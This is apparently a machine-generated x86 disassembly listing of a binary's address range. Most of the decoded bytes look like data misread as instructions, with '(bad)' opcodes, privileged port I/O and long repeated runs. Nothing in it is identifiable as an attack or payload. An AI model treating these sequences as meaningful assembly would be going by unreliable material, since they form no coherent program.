  414ac1:	inc    eax
  414ac2:	inc    esi
  414ac3:	xchg   edi,eax
  414ac4:	jp     0x414b38
  414ac6:	inc    eax
  414ac7:	sbb    BYTE PTR [ebp+0x74],0xc9
  414acb:	dec    eax
  414acc:	fs daa 
  414ace:	leave  
  414acf:	das    
  414ad0:	cmp    dh,BYTE PTR [edi]
  414ad2:	sar    DWORD PTR [ebx],1
  414ad4:	aaa    
  414ad5:	xor    cl,bl
  414ad7:	daa    
  414ad8:	and    eax,0x3f870062
  414add:	ins    DWORD PTR es:[edi],dx
  414ade:	add    al,0x4d
  414ae0:	push   0x4a870763
  414ae5:	(bad)  
  414ae6:	cli    
  414ae7:	inc    ebx
  414ae8:	arpl   WORD PTR [ecx+ecx*1],bp
  414aeb:	es popa 
  414aed:	ins    BYTE PTR es:[edi],dx
  414aee:	or     DWORD PTR ds:0x3cc1656a,ecx
  414af4:	je     0x414b16
  414af6:	mov    ebx,0x637443
  414afb:	fdiv   DWORD PTR [ecx+eiz*2+0x64]
  414aff:	fs cld 
  414b01:	or     DWORD PTR ds:0x726b3d80,ecx
  414b07:	lahf   
  414b08:	es outs dx,BYTE PTR gs:[esi]
  414b0b:	in     al,dx
  414b0c:	pop    edi
  414b0d:	jb     0x414b7c
  414b0f:	jmp    0x414b73
  414b11:	outs   dx,DWORD PTR gs:[esi]
  414b13:	in     al,0x30
  414b15:	and    BYTE PTR [eax-0x32],ch
  414b18:	bound  esi,QWORD PTR [eax+0x3a]
  414b1b:	xor    eax,0xcd77731f
  414b20:	sbb    al,0x65
  414b22:	bound  eax,QWORD PTR [eax]
	...
  414b30:	add    BYTE PTR [eax],al
  414b32:	leave  
  414b33:	outs   dx,BYTE PTR gs:[esi]
  414b35:	jae    0x414afc
  414b37:	fs je  0x414bb1
  414b3a:	stos   DWORD PTR es:[edi],eax
  414b3b:	jnp    0x414b9e
  414b3d:	cs test eax,0x472f695e
  414b43:	add    BYTE PTR [ecx],cl
  414b45:	or     bh,BYTE PTR [edx]
  414b47:	push   es
  414b48:	add    BYTE PTR [eax],al
  414b4a:	or     al,BYTE PTR [esi]
  414b4c:	add    BYTE PTR [eax],al
  414b4e:	or     al,BYTE PTR [esi]
  414b50:	add    BYTE PTR [eax],al
  414b52:	cli    
  414b53:	add    eax,0x5fa0000
  414b58:	add    BYTE PTR [eax],al
  414b5a:	or     al,BYTE PTR [esi]
  414b5c:	add    BYTE PTR [eax],al
  414b5e:	or     al,BYTE PTR [esi]
  414b60:	add    BYTE PTR [eax],al
  414b62:	cli    
  414b63:	add    eax,0x5fa0000
  414b68:	add    BYTE PTR [eax],al
  414b6a:	retf   0x5
  414b6d:	add    dl,cl
  414b6f:	add    eax,0x5ba0000
  414b74:	add    BYTE PTR [eax],al
  414b76:	mov    edx,0xca000005
  414b7b:	add    eax,0x5ca0000
  414b80:	add    BYTE PTR [eax],al
  414b82:	arpl   WORD PTR [ecx+0x1d384eb2],bx
  414b88:	and    BYTE PTR [ebx],ch
  414b8a:	addr16 xor cl,bh
  414b8d:	push   esp
  414b8e:	xchg   DWORD PTR [eax],edx
  414b90:	mov    ds:0x80cb3e62,eax
  414b95:	or     DWORD PTR [eax],eax
	...
  414ba3:	add    BYTE PTR [eax],al
  414ba5:	sub    al,0xf1
  414ba7:	or     ecx,DWORD PTR [eax]
  414ba9:	push   edx
  414baa:	mov    al,ds:0xb37f680a
  414baf:	jnp    0x414c02
  414bb1:	fstp   st(3)
  414bb3:	add    DWORD PTR [eax],eax
  414bb5:	arpl   sp,bx
  414bb7:	add    DWORD PTR [eax],eax
  414bb9:	arpl   si,bx
  414bbb:	add    DWORD PTR [eax],eax
  414bbd:	arpl   si,bx
  414bbf:	add    DWORD PTR [eax],eax
  414bc1:	arpl   si,bx
  414bc3:	add    DWORD PTR [eax],eax
  414bc5:	arpl   si,bx
  414bc7:	add    DWORD PTR [eax],eax
  414bc9:	arpl   si,bx
  414bcb:	add    DWORD PTR [eax],eax
  414bcd:	arpl   si,bx
  414bcf:	add    DWORD PTR [eax],eax
  414bd1:	arpl   si,bx
  414bd3:	add    DWORD PTR [eax],eax
  414bd5:	arpl   si,bx
  414bd7:	add    DWORD PTR [eax],eax
  414bd9:	arpl   si,bx
  414bdb:	add    DWORD PTR [eax],eax
  414bdd:	arpl   si,bx
  414bdf:	add    DWORD PTR [eax],eax
  414be1:	arpl   si,bx
  414be3:	add    DWORD PTR [eax],eax
  414be5:	arpl   si,bx
  414be7:	add    DWORD PTR [eax],eax
  414be9:	arpl   si,bx
  414beb:	add    DWORD PTR [eax],eax
  414bed:	arpl   si,bx
  414bef:	add    DWORD PTR [eax],eax
  414bf1:	arpl   si,bx
  414bf3:	add    DWORD PTR [eax],eax
  414bf5:	arpl   si,bx
  414bf7:	add    DWORD PTR [eax],eax
  414bf9:	arpl   si,bx
  414bfb:	add    DWORD PTR [eax],eax
  414bfd:	arpl   si,bx
  414bff:	add    DWORD PTR [eax],eax
  414c01:	arpl   si,bx
  414c03:	add    DWORD PTR [eax],eax
  414c05:	arpl   si,bx
  414c07:	add    DWORD PTR [eax],eax
	...
  414c15:	add    BYTE PTR [eax],al
  414c17:	add    BYTE PTR [ebx+0x5],ah
  414c1a:	out    0x3,eax
  414c1c:	arpl   WORD PTR ds:0x56303e7,ax
  414c22:	out    0x3,eax
  414c24:	arpl   WORD PTR ds:0x56303e7,ax
  414c2a:	out    0x3,eax
  414c2c:	arpl   WORD PTR ds:0x56303e7,ax
  414c32:	out    0x3,eax
  414c34:	arpl   WORD PTR ds:0x56303e7,ax
  414c3a:	out    0x3,eax
  414c3c:	arpl   WORD PTR ds:0x56303e7,ax
  414c42:	out    0x3,eax
  414c44:	arpl   WORD PTR ds:0x56303e7,ax
  414c4a:	out    0x3,eax
  414c4c:	arpl   WORD PTR ds:0x56303e7,ax
  414c52:	out    0x3,eax
  414c54:	arpl   WORD PTR ds:0x56303e7,ax
  414c5a:	out    0x3,eax
  414c5c:	arpl   WORD PTR ds:0x56303e7,ax
  414c62:	out    0x3,eax
  414c64:	arpl   WORD PTR ds:0x56303e7,ax
  414c6a:	out    0x3,eax
  414c6c:	arpl   WORD PTR ds:0x56303e7,ax
  414c72:	out    0x3,eax
  414c74:	arpl   WORD PTR ds:0x56303e7,ax
  414c7a:	out    0x3,eax
	...
  414c88:	add    BYTE PTR [eax],al
  414c8a:	add    BYTE PTR [ebx+0x5],ah
  414c8d:	out    0x3,eax
  414c8f:	arpl   WORD PTR ds:0x56303e7,ax
  414c95:	out    0x3,eax
  414c97:	arpl   WORD PTR ds:0x56303e7,ax
  414c9d:	out    0x3,eax
  414c9f:	arpl   WORD PTR ds:0x560e900,ax
  414ca5:	add    cl,ch
  414ca7:	pusha  
  414ca8:	add    eax,0x560e900
  414cad:	add    cl,ch
  414caf:	pusha  
  414cb0:	add    eax,0x560e900
  414cb5:	add    cl,ch
  414cb7:	pusha  
  414cb8:	add    eax,0x560e900
  414cbd:	add    cl,ch
  414cbf:	pusha  
  414cc0:	add    eax,0x560e900
  414cc5:	add    cl,ch
  414cc7:	pusha  
  414cc8:	add    eax,0x560e900
  414ccd:	add    cl,ch
  414ccf:	pusha  
  414cd0:	add    eax,0x362ed800
  414cd5:	xor    al,0xd4
  414cd7:	xchg   edx,eax
  414cd8:	add    eax,0x74cf8870
  414cdd:	jne    0x414c6d
  414cdf:	(bad)  
  414ce0:	imul   eax,DWORD PTR [eax],0x6275b879
  414ce6:	mov    esp,DWORD PTR [eax+0x5e]
  414ce9:	jne    0x414d37
  414ceb:	mov    cl,0x79
  414ced:	ja     0x414cd8
	...
  414cfb:	add    BYTE PTR [eax],al
  414cfd:	add    BYTE PTR [edi+0x33],dh
  414d00:	xor    DWORD PTR ds:0x446a0572,ebx
  414d06:	nop
  414d07:	jb     0x414d7a
  414d09:	jmp    0xf572805d
  414d0e:	push   ebx
  414d0f:	aaa    
  414d10:	xor    eax,0x321e60f1
  414d15:	cli    
  414d16:	dec    esp
  414d17:	add    eax,0x1e800b5f
  414d1c:	xor    bl,dl
  414d1e:	pusha  
  414d1f:	popa   
  414d20:	arpl   WORD PTR ds:0xff67627a,bx
  414d26:	pusha  
  414d27:	jns    0x414d8c
  414d29:	add    cl,bl
  414d2b:	pop    esi
  414d2c:	add    BYTE PTR [ebp+ebx*2+0x5f],ch
  414d30:	popa   
  414d31:	add    BYTE PTR [ebx],cl
  414d33:	xor    eax,0x69ba002f
  414d38:	outs   dx,DWORD PTR ds:[esi]
  414d39:	jae    0x414cd0
  414d3b:	addr16 jb 0x414da2
  414d3e:	dec    ebx
  414d3f:	or     DWORD PTR [eax+0x65],ebp
  414d42:	sahf   
  414d43:	imul   ax,WORD PTR [eax],0xffdf
  414d47:	outs   dx,BYTE PTR ds:[si]
  414d49:	imul   esp,DWORD PTR [edi-0x379bff8f],0x69
  414d50:	arpl   WORD PTR [edi-0x64],bp
  414d53:	add    dh,BYTE PTR [edx+esi*2-0x49]
  414d57:	jae    0x414dcd
  414d59:	outs   dx,BYTE PTR ds:[esi]
  414d5a:	int    0x39
  414d5c:	add    BYTE PTR [ecx],dh
  414d5e:	mov    edi,DWORD PTR [ecx]
  414d60:	sub    eax,0x31
	...
  414d71:	mov    eax,DWORD PTR [edx]
  414d73:	gs ins BYTE PTR es:[edi],dx
  414d75:	frstor [eax+0x61]
  414d78:	jns    0x414d67
  414d7a:	je     0x414d7c
  414d7c:	xor    DWORD PTR [eax],ecx
  414d7e:	xor    esi,DWORD PTR [esi*1+0x73001f04]
  414d85:	loop   0x414def
  414d87:	outs   dx,DWORD PTR fs:[esi]
  414d89:	xchg   ebp,eax
  414d8a:	or     DWORD PTR ds:0x31354932,ebp
  414d90:	ss inc ebp
  414d92:	xor    DWORD PTR ds:0x7261a900,esi
  414d98:	imul   ebx,DWORD PTR [ecx+0x75],0x67577300
  414d9f:	outs   dx,DWORD PTR ds:[esi]
  414da0:	push   0x6167a3
  414da5:	aas    
  414da6:	push   0x7367746f
  414dab:	add    BYTE PTR [ebx+0x5d],ah
  414dae:	pop    esp
  414daf:	jo     0x414e26
  414db1:	arpl   WORD PTR [eax],dx
  414db3:	pop    edi
  414db4:	jb     0x414e19
  414db6:	or     al,0x72
  414db8:	addr16 inc ebp
  414dba:	sti    
  414dbb:	pop    esi
  414dbc:	jno    0x414e0e
  414dbe:	fsubr  QWORD PTR [ebp+0x67]
  414dc1:	cmp    al,0xff
  414dc3:	pop    esi
  414dc4:	jb     0x414e29
  414dc6:	push   es
  414dc7:	gs ins DWORD PTR es:[edi],dx
  414dc9:	das    
  414dca:	mov    edx,0xdc3f6c64
  414dcf:	outs   dx,BYTE PTR fs:[esi]
  414dd1:	cmp    al,0xc1
  414dd3:	add    BYTE PTR gs:[eax],al
	...
  414de2:	add    BYTE PTR [eax],al
  414de4:	or     ecx,ecx
  414de6:	jb     0x414e5b
  414de8:	adc    ch,ch
  414dea:	add    DWORD PTR [edi],ebp
  414dec:	push   ecx
  414ded:	jmp    0x414e23
  414def:	xor    dl,BYTE PTR [eax-0x24]
  414df2:	outs   dx,BYTE PTR ds:[esi]
  414df3:	push   0x7660b802
  414df8:	dec    BYTE PTR [ecx-0x770e99ff]
  414dfe:	pusha  
  414dff:	fs hlt 
  414e01:	mov    BYTE PTR [ecx],al
  414e03:	imul   ecx,edx,0xd163656a
  414e09:	fisub  WORD PTR [ecx+esi*2-0x39]
  414e0d:	test   BYTE PTR [ecx],al
  414e0f:	jno    0x414dc5
  414e11:	jg     0x414e75
  414e13:	arpl   WORD PTR [ecx-0x4c8c8d22],si
  414e19:	cmp    DWORD PTR [edx+0x6b],esi
  414e1c:	ret    0x43c
  414e1f:	imul   edi,DWORD PTR [edx-0x79a093c1],0x2a
  414e26:	add    al,0x61
  414e28:	mov    edi,DWORD PTR [ecx]
  414e2a:	pop    ebp
  414e2b:	jno    0x414db3
  414e2d:	fisubr WORD PTR [edx+0x6e]
  414e30:	(bad)  
  414e31:	cmp    DWORD PTR [edx+0x6e],esi
  414e34:	xchg   BYTE PTR [edx],dh
  414e36:	add    al,0x6a
  414e38:	test   BYTE PTR ds:0x66706c1a,al
  414e3e:	out    0x5d,eax
  414e40:	jo     0x414eaa
  414e42:	add    bh,BYTE PTR [ebx+0x4e]
  414e45:	jb     0x414e2e
  414e47:	popa   
	...
  414e54:	add    BYTE PTR [eax],al
  414e56:	add    BYTE PTR [edi+0x62],al
  414e59:	cli    
  414e5a:	jo     0x414e9c
  414e5c:	popa   
  414e5d:	out    0x61,eax
  414e5f:	and    al,0x78
  414e61:	or     al,0x62
  414e63:	sbb    al,0x59
  414e65:	sti    
  414e66:	add    esi,DWORD PTR [edx]
  414e68:	jno    0x414e32
  414e6a:	jno    0x414ea2
  414e6c:	fnstenvw [eax+0x63]
  414e70:	xor    eax,0x35533417
  414e75:	pop    ss
  414e76:	add    al,0x13
  414e78:	jb     0x414e33
  414e7a:	jae    0x414e7b
  414e7c:	popa   
  414e7d:	out    0x69,eax
  414e7f:	div    BYTE PTR [esi-0x35]
  414e82:	bound  ecx,QWORD PTR ds:0xfc62c505
  414e88:	jo     0x414e19
  414e8a:	add    esi,edx
  414e8c:	jno    0x414e1a
  414e8e:	data16 add BYTE PTR [edi-0x19],dh
  414e92:	(bad)
  414e97:	int3   
  414e98:	add    eax,0x71d26e89
  414e9d:	test   BYTE PTR [ecx+0x63],dh
  414ea0:	pop    ebp
  414ea1:	mov    WORD PTR [edx-0x4b],fs
  414ea4:	bound  edi,QWORD PTR [ebp+0x3]
  414ea7:	mov    bl,0x62
  414ea9:	push   edi
  414eaa:	je     0x414e6c
  414eac:	ja     0x414e95
  414eae:	sub    al,0x6e
  414eb0:	xor    al,0x1e
  414eb2:	sub    eax,0x6be73456
  414eb7:	nop
  414eb8:	pop    ebx
  414eb9:	cmp    ebx,DWORD PTR [edi+0x0]
	...
  414ec8:	add    BYTE PTR [eax],al
  414eca:	xchg   ecx,eax
  414ecb:	add    eax,0x628d654b
  414ed0:	add    BYTE PTR [ebp+0x78],al
  414ed3:	add    eax,0x77833f5f
  414ed8:	arpl   WORD PTR [esi],bx
  414eda:	addr16 jno 0x414f45
  414edd:	push   cs
  414ede:	jl     0x414f2c
  414ee0:	jno    0x414ecb
  414ee2:	inc    ecx
  414ee3:	pop    ebx
  414ee4:	gs add al,0x4b
  414ee7:	jbe    0x414ee9
  414ee9:	or     bh,BYTE PTR [edi]
  414eeb:	dec    esp
  414eec:	jb     0x414efb
  414eee:	cmp    BYTE PTR [eax+0x0],ch
  414ef1:	or     eax,0x4675b40
  414ef6:	dec    ebx
  414ef7:	add    eax,0x1c70182f
  414efc:	add    bl,dl
  414efe:	add    eax,0x3ec06e5b
  414f03:	push   0x6413e972
  414f08:	outs   dx,BYTE PTR ds:[esi]
  414f09:	into   
  414f0a:	add    al,0x68
  414f0c:	add    cl,dl
  414f0e:	add    DWORD PTR [ebx+0x6e],ebx
  414f11:	enter  0x508,0x6f
  414f15:	enter  0x71fa,0x71
  414f19:	mov    eax,ds:0x995f5d60
  414f1e:	lock jae 0x414f21
  414f21:	test   cl,al
  414f23:	jno    0x414f97
  414f25:	sbb    al,0x5
  414f28:	jo     0x414eb2
  414f2a:	shl    DWORD PTR [eax+eax*1-0x78],cl
	...
  414f3a:	add    BYTE PTR [eax],al
  414f3c:	add    cl,al
  414f3e:	dec    edx
  414f3f:	pop    edi
  414f40:	mov    cl,al
  414f42:	add    eax,0x3484b436
  414f47:	xor    bl,BYTE PTR [eax]
  414f49:	addr16 dec edx
  414f4b:	imul   ecx,DWORD PTR [eax-0x3f],0x61
  414f4f:	pop    edi
  414f50:	jmp    0x41b5a7d7
  414f55:	mov    dh,0x5b
  414f57:	gs add dl,bh
  414f5a:	pop    edi
  414f5b:	outs   dx,BYTE PTR gs:[esi]
  414f5d:	popf   
  414f5e:	pop    esp
  414f5f:	jb     0x414f61
  414f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f62:	data16 je 0x414fcd
  414f65:	lahf   
  414f66:	jae    0x414f68
  414f68:	jae    0x414fbe
  414f6a:	imul   si,WORD PTR [eax+0x43],0x1
  414f6f:	push   0x65
  414f71:	jns    0x414fe5
  414f73:	arpl   WORD PTR gs:[ebx+0x1],bp
  414f77:	jae    0x414fde
  414f79:	jbe    0x414fdd
  414f7b:	imul   ebp,DWORD PTR [ebp+0x5f],0x1
  414f7f:	jo     0x414ff0
  414f81:	popa   
  414f82:	pop    esp
  414f83:	imul   ebp,DWORD PTR [edi-0x4c],0x956c6506
  414f8a:	ins    BYTE PTR es:[edi],dx
  414f8b:	popa   
  414f8c:	jns    0x414f23
  414f8e:	ins    DWORD PTR es:[edi],dx
  414f8f:	sub    eax,0x2d307b00
  414f94:	xor    DWORD PTR [ebx+0x1],edi
  414f97:	imul   esi,DWORD PTR [ebp-0x37],0x9d6e5d72
  414f9e:	push   es
  414f9f:	push   0x65
	...
  414fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fb1:	jbe    0x41501c
  414fb3:	mov    cl,BYTE PTR gs:[eax+0x71]
  414fb7:	jae    0x414f87
  414fb9:	dec    ecx
  414fba:	outs   dx,BYTE PTR ds:[esi]
  414fbb:	add    al,dl
  414fbd:	popa   
  414fbe:	outs   dx,DWORD PTR ds:[esi]
  414fbf:	ins    DWORD PTR es:[edi],dx
  414fc0:	jecxz  0x415025
  414fc2:	popa   
  414fc3:	add    ch,dl
  414fc5:	jo     0x415024
  414fc7:	outs   dx,BYTE PTR ds:[esi]
  414fc8:	fstp   QWORD PTR [eax+eax*1+0x74]
  414fcc:	fbstp  TBYTE PTR [edx+0x74]
  414fcf:	imul   esp,esp,0xba61005e
  414fd5:	jbe    0x415043
  414fd7:	cmp    ah,BYTE PTR gs:[ebp+0x65]
  414fdb:	arpl   WORD PTR [edx+0x636c6c5c],dx
  414fe1:	cmp    DWORD PTR [eax+esi*2],eax
  414fe4:	jle    0x415023
  414fe6:	arpl   WORD PTR gs:[ebx+0x2f],sp
  414fea:	addr16 popa 
  414fec:	xchg   ecx,eax
  414fed:	inc    ecx
  414fee:	js     0x414ff0
  414ff0:	xor    bl,ah
  414ff2:	push   0x72
  414ff4:	cmp    BYTE PTR [edi],0x67
  414ff7:	add    BYTE PTR [ebp+edx*1+0x60],dh
  414ffb:	ins    BYTE PTR es:[edi],dx
  414ffc:	jp     0x414ffb
  414ffe:	pop    esi
  414fff:	add    BYTE PTR [edx+0x0],cl
  415002:	popa   
  415003:	jbe    0x415043
  415005:	adc    eax,0xdc917361
  41500a:	pop    edi
  41500b:	addr16 inc eax
  41500d:	sti    
  41500e:	pop    edi
  41500f:	arpl   WORD PTR [ebx-0x56],sp
  415012:	aaa    
  415013:	add    BYTE PTR ss:[eax],al
	...
  415022:	add    BYTE PTR [ebp-0x4e],ch
  415025:	aaa    
  415026:	add    BYTE PTR [esi],bh
  415028:	leave  
  415029:	data16 cmp bh,BYTE PTR [bp+si+0x6501]
  41502f:	add    cl,al
  415031:	push   0x1d50275
  415036:	pushw  ss
  415038:	mov    edi,0xb0f4775e
  41503d:	xor    al,0x0
  41503f:	add    ch,BYTE PTR [edi-0x57fb978a]
  415045:	push   0x597cfb00
  41504a:	pop    edi
  41504b:	sti    
  41504c:	jl     0x41504f
  41504e:	jo     0x41501c
  415050:	jg     0x4150c3
  415052:	add    cl,al
  415054:	push   0x68
  415056:	jno    0x415028
  415058:	xchg   ebp,eax
  415059:	pop    edi
  41505a:	arpl   WORD PTR gs:[ebp+ebx*2+0x5f],di
  41505f:	retf   
  415060:	jl     0x4150bf
  415062:	pop    edi
  415063:	retf   
  415064:	fisub  WORD PTR [eax+0x77]
  415067:	mov    al,0x5
  415069:	push   edi
  41506a:	arpl   dx,ax
  41506c:	bound  ebx,QWORD PTR [eax]
  41506e:	add    al,0x88
  415070:	pop    bx
  415072:	js     0x414fff
  415074:	bound  edx,QWORD PTR [esi+0x4]
  415077:	and    BYTE PTR [esi+0x55],0x63
  41507b:	jg     0x4150e3
  41507d:	out    0x74,eax
  41507f:	test   BYTE PTR [ecx+0x3d],bl
  415082:	addr16 jno 0x41508a
  415085:	cmp    DWORD PTR [ecx+0x0],esp
	...
  415094:	add    BYTE PTR [eax],al
  415096:	and    DWORD PTR [edx+0x19],0xe5f6378
  41509d:	jbe    0x4150df
  41509f:	outs   dx,DWORD PTR ds:[esi]
  4150a0:	or     al,0x76
  4150a2:	arpl   WORD PTR [esi+0x1a],sp
  4150a5:	push   0x40f6045
  4150aa:	push   ecx
  4150ab:	data16 or bl,BYTE PTR [eax+eax*2+0x59]
  4150b0:	out    0x75,eax
  4150b2:	adc    al,0x5e
  4150b4:	std    
  4150b5:	gs ds jo 0x4150a0
  4150b9:	push   0x62d35e30
  4150be:	adc    DWORD PTR ds:0x573466d7,eax
  4150c4:	aam    0x77
  4150c6:	arpl   WORD PTR [ebx-0x38],sp
  4150c9:	ja     0x4150c3
  4150cb:	gs int 0x3
  4150ce:	add    bl,BYTE PTR [eax-0x3a]
  4150d1:	pop    esp
  4150d2:	cld    
  4150d3:	popa   
  4150d4:	out    0x65,eax
  4150d6:	or     al,0x5e
  4150d8:	xchg   ebx,eax
  4150d9:	data16 in al,dx
  4150db:	add    al,0x9a
  4150dd:	pusha  
  4150de:	ret    0x8c64
  4150e1:	jne    0x415067
  4150e3:	add    eax,0x5cc25a7c
  4150e8:	mov    WORD PTR [edx+0x63],gs
  4150eb:	arpl   WORD PTR [eax+0x5ac077],dx
  4150f1:	mov    WORD PTR [eax+0x5d],fs
  4150f4:	arpl   WORD PTR [ebp-0x74],di
  4150f7:	pop    edx
  4150f8:	das    
  4150f9:	jmp    0x4150fe
	...
  415106:	add    BYTE PTR [eax],al
  415108:	add    BYTE PTR [ebp-0x7bb098a4],bh
  41510e:	pop    esp
  41510f:	add    BYTE PTR [ebp-0x80],cl
  415112:	pop    esi
  415113:	ins    DWORD PTR es:[edi],dx
  415114:	push   ebp
  415115:	add    BYTE PTR ds:0x48a44871,0x6e
  41511c:	xor    eax,0x4a00489f
  415121:	sbb    BYTE PTR [eax+esi*2+0x48],0x70
  415126:	add    eax,0x5c801064
  41512b:	ins    DWORD PTR es:[edi],dx
  41512c:	cmovnp eax,DWORD PTR ds:0x59480874
  415133:	ins    DWORD PTR es:[edi],dx
  415134:	sbb    esp,DWORD PTR [edi+0x5f]
  415137:	ins    DWORD PTR es:[edi],dx
  415138:	sti    
  415139:	dec    ebp
  41513a:	pop    esp
  41513b:	add    BYTE PTR [ebx],dl
  41513d:	inc    edx
  41513e:	pop    ebp
  41513f:	outs   dx,BYTE PTR ds:[esi]
  415140:	mov    edx,0xfb002f71
  415145:	or     DWORD PTR [esi+0x68],esp
  415148:	enter  0x612e,0x0
  41514c:	retf   
  41514d:	cmp    al,0x60
  41514f:	outs   dx,BYTE PTR ds:[esi]
  415150:	ret    0x2d51
  415153:	xor    ch,cl
  415155:	adc    BYTE PTR [edi+ebx*2-0x36],ah
  415159:	sub    BYTE PTR [ecx+esi*2-0x17],ah
  41515d:	pop    es
  41515e:	pop    edx
  41515f:	ins    DWORD PTR es:[edi],dx
  415160:	lds    esp,FWORD PTR [eax+0x5f]
  415163:	ins    BYTE PTR es:[edi],dx
  415164:	mov    esi,0xe97263eb
  415169:	out    dx,eax
  41516a:	gs ins DWORD PTR es:[edi],dx
  41516c:	mov    es,WORD PTR [eax]
	...
  41517a:	add    BYTE PTR [eax],al
  41517c:	aam    0x62
  41517e:	jb     0x415169
  415180:	mov    esi,0xc2886e46
  415185:	inc    esi
  415186:	add    BYTE PTR [eax],al
  415188:	lock arpl WORD PTR [ecx+0x65],bp
  41518c:	mov    ecx,0xe6735d02
  415191:	pop    esp
  415192:	pop    ebp
  415193:	jae    0x41517b
  415195:	pop    esp
  415196:	add    BYTE PTR [esi-0x6d],dh
  415199:	bound  esi,QWORD PTR [edi+ebp*2-0x48]
  41519d:	pop    eax
  41519e:	add    BYTE PTR [ebp+ebx*4+0x47],ch
  4151a2:	outs   dx,DWORD PTR fs:[esi]
  4151a4:	dec    esp
  4151a5:	add    DWORD PTR ds:0x73720932,ebp
  4151ab:	or     dh,BYTE PTR gs:[edx]
  4151ae:	xor    dh,BYTE PTR [ebx]
  4151b0:	stc    
  4151b1:	xor    al,0x2d
  4151b3:	add    BYTE PTR [ecx],ch
  4151b5:	ins    DWORD PTR es:[edi],dx
  4151b6:	pop    ebp
  4151b7:	jb     0x4151ff
  4151b9:	jae    0x41521c
  4151bb:	imul   ecx,edx,0x5f
  4151be:	popa   
  4151bf:	outs   dx,DWORD PTR ds:[esi]
  4151c0:	js     0x415220
  4151c2:	popa   
  4151c3:	add    BYTE PTR [ebp+0x48],dh
  4151c6:	outs   dx,BYTE PTR ds:[esi]
  4151c7:	outs   dx,BYTE PTR ds:[esi]
  4151c8:	push   edi
  4151c9:	jae    0x4151cb
  4151cb:	ins    DWORD PTR es:[edi],dx
  4151cc:	imul   ebx,DWORD PTR [esi+0x63],0x69
  4151d0:	add    DWORD PTR [si+0x72],esi
  4151d4:	arpl   WORD PTR [edi+0x65],ax
  4151d7:	je     0x41519c
  4151d9:	add    ch,BYTE PTR [ebx+0x6e]
  4151dc:	scas   al,BYTE PTR es:[edi]
  4151dd:	dec    ecx
  4151de:	outs   dx,BYTE PTR ds:[esi]
  4151df:	add    BYTE PTR gs:[eax],al
	...
  4151ee:	add    BYTE PTR [edx-0x64cccdcf],cl
  4151f4:	fs pop edi
  4151f6:	add    BYTE PTR [ecx-0x6e9c9ab6],bl
  4151fc:	pop    ebp
  4151fd:	outs   dx,BYTE PTR ds:[esi]
  4151fe:	add    BYTE PTR [eax-0x52969193],ah
  415204:	je     0x415206
  415206:	arpl   dx,dx
  415208:	je     0x41526f
  41520a:	jae    0x415256
  41520c:	jb     0x41526b
  41520e:	jae    0x415273
  415210:	mov    esi,DWORD PTR [esi+0x30]
  415213:	rol    DWORD PTR [eax+0x6bce5f01],1
  415219:	jne    0x415282
  41521b:	int    0xdc
  41521d:	jb     0x41528f
  41521f:	ret    0x5a6a
  415222:	ja     0x415287
  415224:	jge    0x41528b
  415226:	imul   edi,DWORD PTR [edx-0x7994fbb2],0x4a
  41522d:	pusha  
  41522e:	addr16 test esp,ebx
  415231:	ins    WORD PTR es:[edi],dx
  415233:	jl     0x415274
  415235:	pusha  
  415236:	arpl   WORD PTR [ebx+0x36],sp
  415239:	jb     0x4152a2
  41523b:	xchg   BYTE PTR [esi],dh
  41523d:	push   0x5d446371
  415242:	jo     0x4151ca
  415244:	fdiv   QWORD PTR [edx+0x68]
  415247:	adc    BYTE PTR [eax],0x5d
  41524a:	imul   esp,DWORD PTR [ebx-0xa],0x5a
  41524e:	outs   dx,BYTE PTR ds:[esi]
  41524f:	dec    edi
  415250:	stc    
  415251:	pop    ebp
  415252:	add    BYTE PTR fs:[eax],al
	...
  415261:	add    BYTE PTR [esp+ebx*8],bh
  415264:	pop    ebp
  415265:	ins    DWORD PTR es:[edi],dx
  415266:	xor    al,0x13
  415268:	pop    ebx
  415269:	outs   dx,BYTE PTR ds:[esi]
  41526a:	inc    esp
  41526b:	fcomp  QWORD PTR [ecx+0x5f]
  41526e:	xor    DWORD PTR [eax],eax
  415270:	addr16 ja 0x4152d6
  415273:	jmp    0x4152d5
  415275:	ins    DWORD PTR es:[edi],dx
  415276:	cmp    BYTE PTR [ecx+0xf54006c],bh
  41527c:	xor    eax,0x5ec26335
  415281:	jno    0x415289
  415283:	int3   
  415284:	pop    ecx
  415285:	add    bh,dh
  415287:	test   al,0x62
  415289:	imul   edi,edx,0xfc6765db
  41528f:	les    esi,FWORD PTR [ebp+0x5f]
  415292:	(bad)  
  415293:	(bad)  [eax+eax*1-0x11]
  415297:	add    al,0x8f
  415299:	js     0x415268
  41529b:	imul   eax,DWORD PTR [ecx+esi*2+0x5c975863],0x3936ed1
  4152a6:	shl    DWORD PTR [esi-0x6b],0x67
  4152aa:	les    ebx,FWORD PTR [ecx-0x19]
  4152ad:	push   0x718c59c5
  4152b2:	arpl   WORD PTR [esi+0x7d],sp
  4152b5:	ja     0x415272
  4152b7:	je     0x41530e
  4152b9:	imul   esp,DWORD PTR [ebx+0x68],0x4e
  4152bd:	jb     0x41524c
  4152bf:	push   0x5b
  4152c1:	js     0x415243
  4152c3:	add    eax,0x5d3f
	...
  4152d4:	add    BYTE PTR [edx+0x636b4c70],al
  4152da:	push   ebp
  4152db:	dec    esi
  4152dc:	jne    0x41525e
  4152de:	push   edi
  4152df:	out    0x61,eax
  4152e1:	xor    BYTE PTR [ebx+0x41],0x63
  4152e5:	js     0x415355
  4152e7:	adc    eax,0xe714404
  4152ec:	jbe    0x41532e
  4152ee:	pop    esi
  4152ef:	push   es
  4152f0:	ja     0x41535e
  4152f2:	add    eax,0x5c9172d8
  4152f7:	mov    edx,0x105b6366
  4152fc:	je     0x41533e
  4152fe:	push   edi
  4152ff:	out    0x64,eax
  415301:	inc    eax
  415302:	jae    0x415308
  415304:	jno    0x415342
  415306:	pop    eax
  415307:	out    0x58,eax
  415309:	or     eax,0xf5bc66e
  41530e:	add    eax,0x570074d8
  415313:	shr    DWORD PTR [edx+0x34],cl
  415316:	add    eax,0x660071ca
  41531b:	mov    bl,0x5a
  41531d:	in     eax,dx
  41531e:	imul   eax,DWORD PTR [eax],0x6d7206e9
  415324:	retf   
  415325:	add    DWORD PTR [edi+0x0],edx
  415328:	mov    ah,al
  41532a:	ins    BYTE PTR es:[edi],dx
  41532b:	fs mov bl,dl
  41532e:	add    eax,0x6cd48672
  415333:	imul   eax,DWORD PTR [eax-0x7793a9a0],0x0
	...
  415346:	add    BYTE PTR [eax],al
  415348:	leave  
  415349:	push   0x6cafe972
